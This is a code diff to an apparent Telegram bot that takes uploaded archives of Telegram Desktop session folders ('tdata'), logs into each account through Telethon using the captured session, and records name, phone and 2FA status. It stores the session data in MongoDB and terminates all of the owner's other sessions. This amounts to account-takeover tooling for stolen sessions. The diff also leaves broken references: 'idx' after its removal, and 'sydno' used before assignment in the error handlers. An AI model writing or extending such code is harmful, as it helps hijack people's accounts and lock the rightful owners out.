@@ -48,7 +48,7 @@ async def check_2fa(client):
         return f"2FA: Unknown ({e})"
 
 
-async def show_tdata_structure_and_rar(tdata_path: str, message: Message):
+async def show_tdata_structure_and_rar(tdata_path: str, message: Message, num):
     # 1️⃣ Build structure preview
     structure = []
     for root, dirs, files in os.walk(tdata_path):
@@ -68,11 +68,11 @@ async def show_tdata_structure_and_rar(tdata_path: str, message: Message):
 
     # 2️⃣ Pack into .rar
     tmp_dir = tempfile.mkdtemp()
-    rar_path = os.path.join(tmp_dir, "tdata.rar")
+    rar_path = os.path.join(tmp_dir, f"tdata{num}.rar")
     shutil.make_archive(rar_path.replace(".rar", ""), "zip", tdata_path)
     os.rename(rar_path.replace(".rar", ".zip"), rar_path)  # fake rar extension
 
-    await message.reply_document(rar_path, caption="📦 Your TDATA as RAR")
+    await message.reply_document(rar_path, caption="📦 {num} TDATA as RAR")
     shutil.rmtree(tmp_dir, ignore_errors=True)
 
 async def show_zip_structure(zip_path, message, client):
@@ -143,10 +143,27 @@ class Database:
             return 1
         return last["account_num"] + 1
 
-    async def save_account(self, user_id, account_num, info, tdata_bytes):
+    async def save_account(self, user_id, info, tdata_bytes):
         """
-        Save account info + tdata in MongoDB
+        Save account info + tdata in MongoDB.
+        Ensures account_num is stable (does not change if re-added).
         """
+        # Check if user already exists
+        existing = await self.col.find_one({"_id": user_id})
+        if existing:
+            account_num = existing["account_num"]
+        else:
+            # Also check by phone number to avoid dupes
+            if info.get("phone"):
+                phone_match = await self.col.find_one({"phone": info["phone"]})
+                if phone_match:
+                    account_num = phone_match["account_num"]
+                    user_id = phone_match["_id"]
+                else:
+                    account_num = await self.get_next_account_num()
+            else:
+                account_num = await self.get_next_account_num()
+
         doc = {
             "_id": user_id,
             "account_num": account_num,
@@ -157,6 +174,7 @@ class Database:
             "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
         }
         await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)
+        return account_num
 
     async def total_users_count(self):
         return await self.col.count_documents({})
@@ -254,29 +272,28 @@ async def handle_archive(client, message):
 
         start_num = await db.get_next_account_num()
         for offset, tdata_path in enumerate(tdata_paths, 1):
-            idx = start_num + offset
-            await sy.edit(f"➡️ Sᴛᴇᴘ 4.{idx}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
+            
+            await sy.edit(f"➡️ Sᴛᴇᴘ 4.{offset}: Pʀᴏᴄᴇssɪɴɢ ᴛᴅᴀᴛᴀ ᴀᴛ `{tdata_path}`")
             try:
-                await show_tdata_structure_and_rar(tdata_path, message)
                 
                 tdesk = TDesktop(tdata_path)
                 if not tdesk.isLoaded():
-                    results.append(f"#{idx} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
+                    results.append(f"#{offset} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
                     continue
-                await sy.edit(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{idx}")
+                await sy.edit(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{offset}")
 
                 tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                 await tele_client.connect()
-                await sy.edit(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{idx}")
+                await sy.edit(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{offset}")
 
                 if not await tele_client.is_user_authorized():
                     results.append(f"#{idx} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
-                    await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{idx} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
+                    await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{offset} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
                     continue
 
                 me = await tele_client.get_me()
                 await message.reply(f"👤 Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")
-
+                syd = await check_2fa(tele_client)
                 clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                 with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                     for root, dirs, files in os.walk(tdata_path):
@@ -287,21 +304,23 @@ async def handle_archive(client, message):
 
                 with open(clean_zip_path, "rb") as f:
                     tdata_bytes = f.read()
-                syd = await check_2fa(tele_client)
-                await message.reply(f"{idx} ~ +{me.phone}: {syd}")
-                nsyd = await terminate_all_other_sessions(tele_client)
-                await message.reply(f"{idx} ~ +{me.phone}: {nsyd}")
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
                     "twofa": syd,
                     "spam": getattr(me, "restricted", False),
-                    "account_num": idx,
                 }
-                await db.save_account(me.id, idx, info, tdata_bytes)
+                sydno = await db.save_account(me.id, info, tdata_bytes)
 
+                
+                await show_tdata_structure_and_rar(tdata_path, message, sydno)
+                
+                
+                nsyd = await terminate_all_other_sessions(tele_client)
+                await message.reply(f"{sydno} ~ +{me.phone}: {nsyd}")
+                await message.reply(f"{sydno} ~ +{me.phone}: {syd}")
                 results.append(
-                    f"#{idx}\n"
+                    f"#{sydno}\n"
                     f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
                     f"Pʜᴏɴᴇ Nᴜᴍʙᴇʀ: {info['phone']}\n"
                     f"{info['twofa']}\n"
@@ -309,17 +328,17 @@ async def handle_archive(client, message):
                 )
 
                 await tele_client.disconnect()
-                await sy.edit(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{idx}")
+                await sy.edit(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{sydno}")
 
             except SessionPasswordNeededError:
-                results.append(f"#{idx} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
-                await message.reply(f"❌ ᴛᴅᴀᴛᴀ #{idx}: Nᴇᴇᴅs 2FA ᴘᴀssᴡᴏʀᴅ")
+                results.append(f"#{sydno} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
+                await message.reply(f"❌ ᴛᴅᴀᴛᴀ #{sydno}: Nᴇᴇᴅs 2FA ᴘᴀssᴡᴏʀᴅ")
             except PhoneNumberBannedError:
-                results.append(f"#{idx} 🚫 Bᴀɴɴᴇᴅ ɴᴜᴍʙᴇʀ")
-                await message.reply(f"🚫 ᴛᴅᴀᴛᴀ #{idx}: Bᴀɴɴᴇᴅ ᴀᴄᴄᴏᴜɴᴛ")
+                results.append(f"#{sydno} 🚫 Bᴀɴɴᴇᴅ ɴᴜᴍʙᴇʀ")
+                await message.reply(f"🚫 ᴛᴅᴀᴛᴀ #{sydno}: Bᴀɴɴᴇᴅ ᴀᴄᴄᴏᴜɴᴛ")
             except Exception as e:
-                results.append(f"#{idx} ❌ Eʀʀᴏʀ: {str(e)}")
-                await message.reply(f"❌ Eʀʀᴏʀ ɪɴ Sᴛᴇᴘ 4.{idx}: {e}")
+                results.append(f"#{sydno} ❌ Eʀʀᴏʀ: {str(e)}")
+                await message.reply(f"❌ Eʀʀᴏʀ ɪɴ Sᴛᴇᴘ 4.{sydno}: {e}")
 
         report_text = "📑 Fɪɴᴀʟ Rᴇᴘᴏʀᴛ:\n\n" + "\n".join(results)
         report_path = os.path.join(tempdir, "report.txt")
